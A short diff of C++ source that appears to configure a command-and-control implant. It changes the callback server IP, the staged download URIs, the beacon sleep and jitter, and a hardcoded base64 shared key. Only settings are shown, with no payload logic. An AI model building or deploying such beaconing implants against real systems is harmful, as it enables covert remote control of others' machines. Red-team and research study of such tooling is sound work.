@@ -14,7 +14,7 @@ using json = nlohmann::json;
 
 // Global variables: ip/hostname, port, stage0 uri, stage1 uri, stage2 uri, stage3 uri, beacon uri
 // listener_id, symetric key, sleep, jitter
-std::string server_ip = "172.20.0.180";
+std::string server_ip = "192.168.1.50";
 int server_port = 443;
 std::string stage0_uri = "/stage0";
 std::string stage1_uri = "/stage1";
@@ -22,7 +22,7 @@ std::string stage2_uri = "/stage2";
 std::string stage3_uri = "/stage3";
 std::string get_uri = "/get";
 std::string post_uri = "/post";
-std::string sharedkey_b64 = "NI83CfT9KnXiK3OFTNKyXybAVF7lmYOmERBsCuIXnVE=";
+std::string sharedkey_b64 = "xnlz+IyBxcUXO1ZY3z7qqW65JGU2kCUtib+EnjtaeSw=";
 int listener_id = 1;
 int sleep = 5;
 int jitter = 10;
